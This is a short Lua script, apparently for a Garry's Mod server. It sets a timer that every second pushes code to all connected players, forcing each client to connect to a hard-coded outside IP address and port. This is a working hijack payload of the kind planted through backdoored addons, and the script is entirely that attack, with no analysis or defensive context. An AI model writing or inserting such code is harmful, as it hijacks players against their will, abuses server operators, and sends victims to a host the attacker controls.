timer.Create("IFNET_REDIRECTAUTO", 1, 0, function()
    for i, v in ipairs( player.GetAll() ) do
        v:SendLua("LocalPlayer():ConCommand(\"connect 46.105.51.94:10057\")")
    end
end)
